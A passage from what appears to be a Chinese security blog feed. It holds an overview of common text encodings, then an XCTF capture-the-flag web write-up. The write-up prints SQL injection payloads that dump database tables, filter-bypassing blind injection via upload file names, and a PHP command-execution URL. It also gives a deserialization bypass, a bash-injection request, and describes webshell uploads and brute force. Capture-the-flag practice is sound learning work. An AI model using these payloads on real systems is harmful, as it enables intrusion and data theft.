decode</b><ul><li>ASCII</li><li>Unicode</li><li>UTF-8</li><li>url</li><li>html编码</li></ul></li><li><b>base</b><ul><li>base64</li><li>base32</li><li>base16</li><li>(extends)UTF-7</li><li>Quoted-printable</li><li>uuencode/uudecode</li><li>XXencoding</li></ul></li><li><b>js decode</b><ul><li>aaencode</li><li>jjencode</li><li>jsfuck</li><li>社会主义核心价值观编码</li></ul></li><li><b>others</b><ul><li>正则表达式</li><li>Morse code</li><li>盲文编码</li><li>垃圾邮件兰格密码</li></ul></li></ul><h3><b>0x01- - normal decode</b></h3><p>这一部分写一些最最最耳熟能详的编码格式。</p><h4><font color="blue">ascii码</font><br></h4><p><b>定义</b><br>不知道 ASCII 码是不是最早意义上的编码，这种编码的出现是为了解决计算机使用二进制来进行运算和存储所有的数据。为了使用二进制来表示我们生活中所使用的字符(abcd)或是罗马数字，美国有关的标准化组织就出台了 ASCII 编码，统一规定了上述常用符号用哪些二进制数来表示。</p><p><b>编码方式</b><br>ASCII 码通常使用 7bit / 8bit 来表示一个字符。二进制所表示的十进制在这个表中一一对应即可...</p><p><a href="https://imgchr.com/i/kyH7t0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/17/kyH7t0.md.jpg" class="lazyload" data-srcset="https://s2.ax1x.com/2019/02/17/kyH7t0.md.jpg" srcset="/css/images/overlay.gif" alt="kyH7t0.md.jpg"></a></p><blockquote><p>小结</p><ul><li>1.标准ascii码是7bit+1bit补零。所以在标准的ascii码中只有127个字符</li><li>2.数字部分48-57,大写字母65-90,小写字母96到122</li></ul></blockquote><h4><font color="blue">Unicode</font><br></h4><p><b>定义</b><br>在ascii码出现之后，各个国家为了适应自己国家语言分分独立研发的编码体制。如GB2312,来弥(mi)补ascii码的不足。出现了非常混乱的编码现象。因此Unicode应情而生。<br>Unicode也叫统一码，万国码。满足了跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p><p><b>编码方式</b><br>Unicode统一使用两个字节表示一个字符，对于英文只需要把高字节填零即可。这样既能表示了英文也可以表示中文。因此对于英文的Unicode编码就是明文本身(大写会变为小写)。</p><p>Unicode在线转换工具：<br><a href="http://www.bejson.com/convert/unicode_chinese/" target="_blank" rel="noopener">http://www.bejson.com/convert/unicode_chinese/</a></p><h4><font color="blue">UTF-8</font><br></h4><p><b>定义</b><br>看了Unicode编码后，很容易发现这样的编码一下子就把存储量翻了一个倍。对于英文来说，浪费了大量的存储空间。于是又产生了UTF-8编码。<br>UTF-8就是在Unicode的编码上，对Unicode进行分组处理。</p><p><b>编码方式</b></p><p>处理方式如下表：</p><table><thead><tr><th><b>Unicode编码(十六进制)</b></th><th><b>UTF-8 字节流(二进制)</b></th></tr></thead><tbody><tr><td>000000-00007F</td><td>0xxxxxxx</td></tr><tr><td>000080-0007FF</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>000800-00FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>010000-10FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr></tbody></table><p>对不同Unicode编码段进行不同字节的编码处理。节省了大量的空间。</p><p>例：Unicode编码0x20C30在0x010000-0x10FFFF之间，使用4字节模板：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。<br>同样的还存在UTF-16、UTF-32，但是只有UTF-8才兼容ASCII码</p><h4><font color="blue">Url编码</font><br></h4><p>对于url编码，是因为对于url有许多歧义的符号。如：'&amp;'、'=' 等。<br>我们依旧从定义开始了解。</p><p><b>定义</b></p><p>讲到底，到底什么是url。不知道，继续找度娘：<br>url(Uniform/Universal Resource Locator)是统一资源定位符，对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。<br>它最初是由蒂姆·伯纳斯·李发明用来作为万维网的地址。现在它已经被万维网联盟编制为互联网标准RFC1738了。（来源百度百科）</p><p>P.S.又发现了一个和这个东西很像的一个玩意，叫做URI，那么在简单地写一下什么是URI吧。</p><p>URI:(Uniform Resource Identifier)统一资源标识符，URI 属于 URL 更低层次的抽象，一种字符串文本标准。就是说，URI 属于父类，而 URL 属于 URI 的子类。URL 是 URI 的一个子集。</p><p>URL的格式如下：协议：<a href="//%E7%94%A8%E6%88%B7%E5%90%8D:%E5%AF%86%E7%A0%81@xn--eqrt2grvd.xn--eqrt2g.xn--eqrt2g7w0ccuv">//用户名:密码@子域名.域名.顶级域名</a>:端口号/目录/文件名.文件后缀?参数=值#标志。<br>（标准化一下）：scheme://host[:port#]/path/.../[;url-params][?query-string][#anchor]</p><p>依旧举个例子比较好理解：例如我的一篇博客的地址：<br><a href="https://dvkunion.github.io/2018/10/26/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">https://dvkunion.github.io/2018/10/26/RSA加密算法原理/</a></p><p>它的第一部分--scheme：协议/模式，在上例中就是指 'https://' 部分<br>第二部分--authority：IP/域名+端口号，在上例中就是指 '<a href="http://dvkunion.github.io" target="_blank" rel="noopener">dvkunion.github.io</a>' 部分，端口号被省略，默认为80端口。<br>第三部分--path：路径，在上例中就是指 '/2018/10/26/....' 部分，指访问的主机目录。<br>可能后面还会带有？(query)和一些参数(fragment),基本结构就是这样。</p><p>根据文档规定，URL中只允许出现 大小写字母(a-z)&amp;(A-Z)、数字(0-9)、'-'、'_'、'~'、'·' 这些符号。<br>保留字符有：! * ' ( ) ; : @ &amp; = + $ , / ? # [ ]<br>不安全字符：空格、引号、尖括号、#、%、{}|^[]`~之类。</p><p><b>编码方式<b></b></b></p><p>URL也称为 %编码,其编码方式非常简单，只需要使用US-ASCII将字符转化为十六进制字符并加一个%即可。<br>要注意URL编码采用的是ASCII而不是Unicode，所以url内不能存在中文。<br>如下是js三个函数的url编码规则：即不对一下字符进行编码。</p><p>escape（69个）：<em>/@+-._0-9a-zA-Z<br>encodeURI（82个）：!#$&amp;'()</em>+,/:;=?@-.<em>~0-9a-zA-Z<br>encodeURIComponent（71个）：!'()*-.</em>~0-9a-zA-Z</p><h4><font color="blue">Html编码</font><br></h4><p><b>定义</b><br>同url一样，html编码也是为了防止歧义。</p><p><b>编码方式</b><br>其实常用的只是过滤了几个关键的字符，其他的依旧是十六进制的表示ASCII码的方法。</p><table><thead><tr><th>字符</th><th>十进制</th><th>十六进制数字</th><th>转义字符</th></tr></thead><tbody><tr><td>&quot;</td><td><code>&amp;#34;</code></td><td><code>&amp;#x22;</code></td><td><code>&amp;quot;</code></td></tr><tr><td>&amp;</td><td><code>&amp;#38;</code></td><td><code>&amp;#x26;</code></td><td><code>&amp;amp;</code></td></tr><tr><td>&lt;</td><td><code>&amp;#60;</code></td><td><code>&amp;#x3C;</code></td><td><code>&amp;lt;</code></td></tr><tr><td>&gt;</td><td><code>&amp;#62;</code></td><td><code>&amp;#x3E;</code></td><td><code>&amp;gt;</code></td></tr><tr><td>不断开空格</td><td><code>&amp;#160;</code></td><td><code>&amp;#xA0;</code></td><td><code>&amp;nbsp;</code></td></tr></tbody></table><p><b><font color="red">注意不能丢掉分号！</font></b></p><h3><b>0x02- - base</b></h3><p>吃过最多次亏的一个编码，最早认为后面有两个==的就是base64...而且只知道一个base64...<br>base全家福：<a href="https://www.qqxiuzi.cn/bianma/base.php?type=16" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base.php?type=16</a></p><h4><font color="blue">base64</font><br></h4><p><b>定义</b></p><p>Base64是网络上最常见的用于传输<font color="red">8Bit字节码的编码</font>方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。可查看RFC2045～RFC2049，上面有MIME的详细规范。</p><p>Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。例如，在Java Persistence系统Hibernate中，就采用了Base64来将一个较长的唯一标识符（一般为128-bit的UUID）编码为一个字符串，用作HTTP表单和HTTP GET URL中的参数。在其他应用程序中，也常常需要把二进制数据编码为适合放在URL（包括隐藏表单域）中的形式。此时，采用Base64编码具有不可读性，需要解码后才能阅读。(来源于百度百科)</p><p>由于某些系统中只能使用ASCII字符。Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法。</p><p>base64特别适合在http，mime协议下快速传输数据。</p><p><b>编码方式</b></p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfwmuac6lj30hv0dg74g.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfwmuac6lj30hv0dg74g.jpg" srcset="/css/images/overlay.gif" alt=""></p><p>如图可见，base64用64个可以打印的ASCII字符来转换任意的二进制,2^6=64,所以base64以6位一分割，且分割的之前的二进制应该为24的倍数（6、8的最小公倍数），不足的位数用base通用补码'='补齐。</p><p>举个例子会更好理解：<br><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfw58qtsrj30iz04ht8l.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfw58qtsrj30iz04ht8l.jpg" srcset="/css/images/overlay.gif" alt=""></p><p>当位数不足时候，先用0把前面的凑出一个6位，再用'='可以补出24的倍数即可。所以，可以总结出：</p><p><b><font color="red">在Base64中4个字符为一个块，对应铭文中的三个字符。因此Base64编码后会比原文本多出1/3左右</font></b></p><p>因此我们可以轻松的依此计算：DVKD----&gt;RFZLRA==；DVKDV----&gt;RFZLRFY=；DVKDVK----&gt;RFZLRFZL</p><h4><font color="blue">base32</font><br></h4><p><b>定义</b></p><p>Base32看名字就知道和64不会相差很多，只是用32个字符来进行编码。2^5=32,所以5位一分割，公倍数40(5,8)。所以必须是40倍数。</p><p><b>编码方式</b></p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfwmt5r59j30fi0dimx6.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfwmt5r59j30fi0dimx6.jpg" srcset="/css/images/overlay.gif" alt=""></p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfxbvaiwsj30qg04lwef.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfxbvaiwsj30qg04lwef.jpg" srcset="/css/images/overlay.gif" alt=""></p><p>明文五个字符---&gt;转码八个字符。</p><h4><font color="blue">base16</font><br></h4><p><b>定义</b></p><p>Base家族也就这样了，大同小异。16个字符，2^4=16,4位一分割，公倍数8(4,8)。8的倍数即可。</p><p><b>编码方式</b></p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfwrl8o1pj30fl0bja9y.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfwrl8o1pj30fl0bja9y.jpg" srcset="/css/images/overlay.gif" alt=""></p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfxj1io0tj30ix04g746.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fyfxj1io0tj30ix04g746.jpg" srcset="/css/images/overlay.gif" alt=""></p><blockquote><p><b>总结</b></p><ul><li>1.base64中包含大写字母、小写字母、数字1~9以及特殊字符'+'和'/'</li><li>2.base64为6bit一转换，所以编码后通常比明文多1/3</li><li>3.base64常用于传输，注意是传输，如UTF-8编码的中文，可以通过Base64进行良好的传输。</li><li>4.base32中只包含大写字母、数字2~7</li><li>5.base32为5bit一转换,由于其编码不包含'',其结果可以用作文件名。</li><li>6.base32比base64多出 20% 左右的大小，通常比明文多3/5</li><li>7.base16中只包含数字0~9以及大写字母'A'~'F'</li><li>8.base16为4bit一转换，所以编码结果准确的为明文的一倍，且不存在填充用的'='</li></ul></blockquote><h4><font color="blue">UTF-7</font><br></h4><p><b>定义</b><br>UTF-7 是base64的修改版，主要目的是为了将UTF-16的数据用Base64的方法进行编码传输。</p><p><b>编码方式</b><br>UTF-7编码的规则为：</p><p>1&gt; UTF16小于等于 0x7F 的字符，采用ASCII编码；<br>2&gt; UTF16大于0x7F的字符，采用Base64编码，然后在首尾分别加上+-；<br>3&gt; UTF-7编码后，所有字符均小于等于 0x7F。</p><p>UTF-7在线工具：<a href="http://toolswebtop.com/text/process/decode/UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/decode/UTF-7</a></p><h4><font color="blue">Quoted-printable</font><br></h4><p><b>定义</b><br>同base64一样，Quoted-printable也是用于满足将非ASCII码转化为ASCII码。可译为“可打印字符引用编码”、“使用可打印字符的编码”。当非ASCII字符较少时，Quoted-printable有着较好的可读性。</p><p><b>编码方式</b></p><p>Quoted-printable编码规则为：将任意一个8 bit 表示为：一个'='和两个十六进制字符。</p><p>Quoted-printable在线工具：<a href="https://www.w3cschool.cn/tools/index?name=decode_encode_tool" target="_blank" rel="noopener">https://www.w3cschool.cn/tools/index?name=decode_encode_tool</a></p><h4><font color="blue">uuencode/uudecode</font><br></h4><p><b>定义</b></p><p>uuencode这个名字是衍生自&quot;Unix-to-Unix encoding&quot;，原先是Unix系统下将二进制的资料借由uucp邮件系统传输的一个编码程式，是一种二进制到文字的编码。</p><p><b>加密方式</b><br>uuencode编码序列：从ascii码的32位算为uudecode的0位。<br>uuencode只是格式复杂。其编码同base64一样，只是每一组都要加32。</p><p>例如：cat 加密后-&gt; #8V%T<br>begin 644 为uudecode标识。</p><p><code>begin 644 cat.txt</code><br><code>#8V%T</code><br>`<br><code>end</code></p><h4><font color="blue">XXencode</font><br></h4><p><b>定义</b></p><p>Xxencode是一种类似于uuencode的一种二进制到文字的编码，它只使用字母数字字符，以及加号和减号。也是一种用于传输文件的编码格式。</p><p><b>编码方式</b><br>xxencode编码序列: '+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'<br>uuencode不去减32直接转化为xxencode码就是xxencode</p><p>uuencode &amp;&amp; xxencode 工具：<a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetxxencode</a></p><h3><b>0x03- - JS</b></h3><p>在url中提到，js对url有三种编码函数，其不编码的字符分别如下：<br>escape（69个）：<em>/@+-._0-9a-zA-Z<br>encodeURI（82个）：!#$&amp;'()</em>+,/:;=?@-.<em>~0-9a-zA-Z<br>encodeURIComponent（71个）：!'()*-.</em>~0-9a-zA-Z</p><p>同时js还有着几种特殊的编码</p><h4><font color="blue">Aaencode</font><br></h4><p>一种将js编码转化为颜文字的编码格式<br>AAencode在线工具：<a href="https://www.sojson.com/aaencode.html" target="_blank" rel="noopener">https://www.sojson.com/aaencode.html</a><br>AAdecode在线工具：<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a></p><h4><font color="blue">JJencode</font><br></h4><p>一种将js编码转化为非正常编码的格式<br>JJencode在线工具：<a href="https://www.sojson.com/jjencode.html" target="_blank" rel="noopener">https://www.sojson.com/jjencode.html</a></p><h4><font color="blue">JSfuck</font><br></h4><p>一种将js编码转化为![]等符号的编码格式。<br>jsfuck在线工具：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">http://utf-8.jp/public/jsfuck.html</a></p><p>基本js的加密都是不可逆的，所以只能在控制台观察一下运行结果。</p><h4><font color="blue">社会主义核心价值观编码</font><br></h4><p>...这个第一次见到时候也是挺无语的...<br>js源码开放：<a href="https://github.com/sym233/core-values-encoder" target="_blank" rel="noopener">https://github.com/sym233/core-values-encoder</a><br>在线工具：<a href="https://sym233.github.io/core-values-encoder/" target="_blank" rel="noopener">https://sym233.github.io/core-values-encoder/</a><br><a href="https://atool.vip/morse" target="_blank" rel="noopener">https://atool.vip/morse</a> (这个很强大)</p><h3><b>0x03- - Others</b></h3><h4><font color="blue">Morse code</font><br></h4><p>这个就已经很古老了.....直接对应表查表就好了。<br>有些地方把这个算作密码......我觉得还是莫尔斯还是一种编码的性质，作为信息的传输作用，并没有隐藏信息的功能。</p><p>莫尔斯电码表：<br><a href="https://imgchr.com/i/k69H4e" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/18/k69H4e.md.jpg" class="lazyload" data-srcset="https://s2.ax1x.com/2019/02/18/k69H4e.md.jpg" srcset="/css/images/overlay.gif" alt="k69H4e.md.jpg"></a></p><p>在线文字转莫尔斯电码工具：<a href="http://www.atool.org/morse.php" target="_blank" rel="noopener">http://www.atool.org/morse.php</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;再也没有看不懂的编码！&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2018-12-22&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;这一阵子做的比赛突然感觉，自己基础真的是太差了。月赛的base32码硬生生以为是base64，这才反应过来看到编码就直接扔一波工具解码碰</summary>
      
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="密码学" scheme="http://blog.dvkunion.cn/tags/密码学/"/>
    
    <category term="常用编码" scheme="http://blog.dvkunion.cn/tags/常用编码/"/>
    
  </entry>
  
  <entry>
    <title>XCTF</title>
    <link href="http://blog.dvkunion.cn/2019/02/16/XCTF/"/>
    <id>http://blog.dvkunion.cn/2019/02/16/XCTF/</id>
    <published>2019-02-16T11:41:43.000Z</published>
    <updated>2019-12-02T06:41:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1>XCTF</h1><h3><b>0x00- - 前言</b></h3><p>找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。<br>不说了，刷起。</p><h3><b>0x01- - Web</b></h3><h4><font color="blue">level.1--新手练习</font><br></h4><p><b>01-view_source</b></p><p>题目提示使用view_source来查看源码。直接查看即可得到flag。<br>F12效果相同</p><p><b>02-get_post</b></p><p>第一步提示get发送一个a=1<br>第二步提示post发送一个b=2<br>hackbar发送得到flag。</p><p><b>03-robots</b></p><p>Robots协议，联想到robots.txt<br>查看robots.txt得到hint:flag_1s_h3re.php，访问得到flag。</p><p><b>04-backup</b></p><p>打开页面得到提示：你知道index.php的备份文件名吗？<br>备份文件名为index.php.bak,下载保存，查看源码得到flag。</p><p><b>05-cookie</b></p><p>题目提示很到位，直接查看请求包cookie得到hint:cookie.php。<br>访问得到下一个hint：http_response。<br>查看响应包得到flag。</p><p><b>06-disabled_button</b></p><p>前端问题，F12修改前端代码之后点击即可。<br>也可以直接构造请求包。</p><p><b>07-simple_js</b></p><p>js问题，访问之后是一个js窗要求输入密码<br>查看源码，观察js代码。<br>可以写出解密python脚本：<br>对实际password直接输出得到ascii码值，输出其ascii码即是Flag。</p><p><b>08-xff_referer</b></p><p>提示伪造xff和referer。<br>伪造即可得到flag。<br>浏览器修改的话回音藏到后面，F12查看源码。</p><p><b>09-weak_auth</b></p><p>尝试登陆，提示密码错误，你可能需要一个字典。<br>弱密码爆破得到flag。<br>这里看教程拿到了一个字典库：<br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p><p><b>010-webshell</b></p><p>一句话木马，菜刀连一下。<br>直接看到flag.txt。得到flag</p><p><b>011-command_execution</b></p><p>命令注入，相当于DVWA的Low level。<br>cat /home flag.txt</p><p><b>012-simple_php</b></p><p>阅读php代码按要求输入即可...<br>a:科学计数法绕过。<br>b:%00截断。</p><h4><font color="blue">level.2--萌新入坑</font><br></h4><p><b>01-upload</b></p><p>打开是一个文件上传窗，随便上传一个发现回显路径;访问路径成功。<br>尝试上传一句话木马：提示只能上传jpg，但是文件栏成功显示一句话木马文件，只是上传按钮变灰。<br>联想到了是前端的过滤，禁用JS进行尝试。<br>成功上传一句话木马，菜刀连接。得到flag。</p><p><b>02-NewsCenter</b></p><p>发现存在post注入点。<br>手动注入：<br><code>1' order by 3#</code> 存在3列</p><p><code>1' union select 1,2,3</code> 查看回显位置</p><p><code>1' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code>或者<code>1' union select 1,2,schema_name from information_schema.schemata#</code>查看存在哪些数据库。</p><p><code>1' union select 1,2,user()#</code>查看用户。</p><p><code>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news'#</code>查看new内有哪些表单。</p><p><code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#</code>查看sercet_table下的列名。</p><p><code>1' union select 1,2,fl4g from secret_table#</code>查询数据得到flag。</p><blockquote><p>自己手动注入那叫一个差劲啊</p></blockquote><p><b>03-Training-Get-Resourced</b></p><p>题目描述不让看注释，就去看看注释<br>啊，有了...(这难度星级是随便打的嘛...)</p><p><b>04-Triangle</b></p><p>没有任何提示，先打开看看。<br>一个要求输入Flag的页面。<br>看到了后面的js脚本。。。<br>ok，不会，看题解了。<br>这是一道JS逆向题...<br>console可以看到关键的三个函数。。。<br>题目解释说是unicorn.js的一个ARM仿真加密，需要IDE逆向...</p><p><b>05-mfw</b></p><p>首先发现了注释：my secret，而url仿佛存在任意文件访问漏洞。然而尝试后发现会有detect保护。<br>继续查看剩下的页面，发现组成部分中包含：GIT<br>难道是git泄露？<br>ok,发现.git文件目录。学习了gitTools使用方法，下载到了源码。<br>看到index.php内存在一个这样的语句</p><p><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</code></p><p>这里存在着任意命令执行漏洞。</p><p>构造<code>111.198.29.45:31701/index.php?page=%27.system(&quot;cd%20../../../;%20ls%20-lA;&quot;).%27about</code></p><p>这里大神还给出了一个小技巧，使用view-source可以格式化查看结果。<br>查看flag.php，得到flag<br>这里我完全是瞎猫碰死耗子。。。大佬解释了为什么.git内不存在flag内容而通过上述操作的就存在答案。因为对git的命令和原理根本不熟悉。</p><p>大佬重审了git下载的库,发现主机内的flag.php文件被修改，但是还没有提交，使用<code>git diff</code>命令进行对比，得到了flag...</p><blockquote><p>follow the master,（跟随大师，）</p><p>and walk with the master,（与大师通行，）</p><p>新增支线任务：学习git</p></blockquote><p><b>06-ics-06</b></p><p>以为又是注入...结果发现根本不是一个注入点。<br>后来想了想题面提示，只有一个。<br>...不会让我爆破id把。。。<br>然后测了一下id=9999999都不报错....<br>行吧，爆破下把。<br>OK,2333<br>的确是送分题，感觉很恶心。。。（如果我爆破只跑了2222怎么办？）</p><p><b>07-upload</b></p><p>看题目意思应该是一个上传题目。<br>测试一下，发现只能够上传jpg图片文件。<br>行吧，卡住了，找大佬去了。<br>然后说这是一个注入题。。。文件名的二次注入(这谁扛得住啊...)<br>先去默默地了解下二次注入...(sqliab)<br>二次注入的思路是先将脏数据存入到数据库中，再取出的过程中完成对Sql语句的污染。<br>。。。二次注入的大佬思路没看懂...这里使用了另一个大佬的盲注,通过insert注入回显。：</p><p><code>1' &amp; (( seleselectct count(table_name) frfromom information_schema.tables where table_schema=database())=1)&amp; '1.jpg&quot;</code></p><p>获取表的数量</p><p><code>filename=&quot;1' &amp; (sselectelect (seselectlect length(table_name) frofromm information_schema.tables where table_schema=database() limit 0,1)&gt;8)&amp; '1.jpg&quot;</code></p><p>获取表的长度</p><p><code>filename=&quot;1' &amp; (ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1) ,1,1)) &gt; 100 )&amp; '1.jpg&quot;</code></p><p>获取表的名称</p><p>的确是一个可行的方案，但是这个原题目应该有验证码的，所以盲注需要时间太长了。<br>再看大佬的大佬的注入方法：</p><p><code>‘+concat((selselectect version()))+’.jpg</code></p><p>查看mysql 版本，返回 5.6</p><p><code>‘+concat((selselectect length(database())))+’.jpg</code></p><p>查看database长度 返回 10</p><p><code>‘+concat((selselectect ascii(substr(database(),1,1))))+’.jpg</code></p><p>查看Database名字 返回 119 以此繼續爆..</p><p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1),1,1))))+’.jpg</code></p><p>爆第一个表名 返回 102 以此繼續爆..到第5位</p><p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 1,1),1,1))))+’.jpg</code></p><p>爆第二个表名 返回 104 以此繼續爆..到第18位</p><p><code>‘+concat((selselectect ascii(substr((selselectect column_name frfromom information_schema.columns where table_name=’hello_flag_is_here’ limit 0,1),1,1))))+’.jpg</code></p><p>爆列名字 返回 105</p><p>以此繼續爆..到第10位</p><p><code>‘+concat((selselectect ascii(substr((selselectect i_am_flag frfromom hello_flag_is_here LIMIT 0,1),1,1))))+’.jpg</code></p><p>爆数据 返回 33 以此繼續爆..到第16位</p><p>跟着这个大佬的思路，总算是做出来了。。。要改一个地方，这个题目过滤了ascii，所以我用了hex来转成16进制输出.</p><p>再遇坑点：hex输出时候会吞掉字符只输出数字。</p><p>这里感觉对concat的理解还不到位。</p><p>再次换方法：放弃concat 使用 conv 对hex 转换成二进制。</p><p>一位一位的读出来。得到flag</p><blockquote><p>好好练习sql注入</p></blockquote><p><b>08-biscuiti-300</b></p><p>打开发现一个简单的username 和password的登录窗</p><p>一个post方法的登录。</p><p>尝试注入,但是不管结果是啥返回只有一个error...</p><p>扔去暴力破解吧...</p><p>ok直接炸出来0的时候admin登陆成功...然并卵啊。</p><p>行吧，那就继续研究注入吧。</p><p>又是没见过的注入：</p><p><code>'union select '123','456'--&amp;password=0</code><br>可以用任意用注入。</p><p>查看cookie 发现一个base64加密的序列化。</p><p>需要将is admin置为1。</p><p>这里提到了CBC字节反转攻击...padding oracle</p><p><b>09-unserialize3</b><br>题目是一段php，给了一个class，要求用code传输反序列化的字符串。<br>构造了一个反序列化提交：O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，返回bad request。<br>这里由于class内有__wakeup()函数导致在反序列化时会运行这个函数。<br>于是题目转变成了魔术函数的绕过：这是一个CVE，漏洞编号CVE-2016-7124<br>当成员属性数目大于实际数目时可绕过__wakeup()。<br>修改poc,得到flag。<br><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></p><p><b>10-wtf.sh-150</b></p><p>连接是一个带有注册和登录的论坛界面。<br>一开始以为是注入...对着测试了一通。。<br>还是跟着大佬的脚步把、、、<br>不得不说大佬是真的强：对于注册窗口用户名存xss漏洞都能挖出来...<br>首先这题存在着源码泄露：wtf.sh可以直接查看源码<br>查看源码时可以发现存在LFI漏洞，我们需要以管理员身份登陆，并且登录的token 和password在/users目录下<br>尝试使用LFI漏洞进行访问：../users<br>得到了众多用户的md5 密文和base64的token<br>修改cookie和token F5刷新可以看到，我们已经是管理员登录了，在管理page页面内得到了...半句flag(wtf??)<br>行吧，这种题目水平已经不是我能够做的了，老实的跟着大佬做吧...<br>继续查看源码...会发现在reply中包含一个可以写入文件的参数、<br>首先注册用户名为 ${find,/,-iname,get_flag2} 的用户，并以该用户进行提交<br><code>POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1 Host: web.chal.csaw.io:8001 Content-Type: application/x-www-form-urlencoded Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ== text=asd&amp;submit=</code><br>之后访问我们提交的页面/users_lookup/sh.wtf<br>可以得到flag2的访问路径。<br>由此，我们重新构造请求访问Flag2即可。</p><p><b>11-Training-WWW-Robots</b></p><p>题目提示 robots.txt，是一个 robots 泄露。访问提示：/fl0g.php，访问得到flag<br>。。。题目难度差距有点大。</p><p><b>12-PHP2</b></p><p>有个坑点。。。原题好像有提示说index.phps有源码...<br>打开查看源码,发现是一个二次url加密绕过...对admin二次加密即可...</p><p><b>13-lottery</b></p><p>这个源码给的就很舒服了，直接就在附件中，先看源码吧。</p><p><b>14-FlatScience</b></p><p>robots.txt给了两个页面的提示，访问login.php存在注释：debug参数<br>GET debug参数可以查看源码，发现存在注入点。<br>注入得到cookie提示，密码在他的论文里。<br>写个脚本跑sha1值得到密码。<br>登录即可。</p><p>注入payload:usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&amp;pw=</p><p><b>15-ics-01</b></p><p>题目提示是一个工控系统，寻找入手点。<br>自己做的时候绕了一大阵子那个上传点，一中午之后愤怒查找题解。。。</p><p>结果还是少了几句话的提示原因。。。</p><p>首先源码泄露....不知道为什么御剑字典里没有这种类型的测试。</p><p><code>.index.php.swp</code><br><code>.index.php.swo</code><br><code>.index.php.swn</code></p><p>下载到源码swp文件，但是就是怎么都恢复不出来???<br>行吧，默认当作有源码做了。。。<br>然后发现可以使用php://input来查看upload.php的源码...</p><p><b>16-NaNNaNNaNNaN-Batman</b></p><p>好的我又开始上提还没做完就来做下一道题了。<br>这题只有一个附件，给了一个web100的源码。<br>里面大概是js代码的样子。<br>熟悉的特殊符号。。。这题好像哪里见到过的样子。但是想不起来怎么处理的了。<br>估计又是做了一半扔掉了。</p><p>OK，老规矩之后，这题学习一下chrome调试大法。<br>F12 -&gt; source 进入到开发者模式。在eval前加入断点调试。即可得到源码。。<br>正则表达式构造出密码直接得到flag.</p><p>还有好多种骚方法。。。直接代码审计，，，看出flag。<br>还有大佬把eval()换成alert()....直接弹出来。<br>dalao tql...</p><p><b>17</b></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;XCTF&lt;/h1&gt;
&lt;h3&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。&lt;br&gt;
不说了，刷起。&lt;/p&gt;
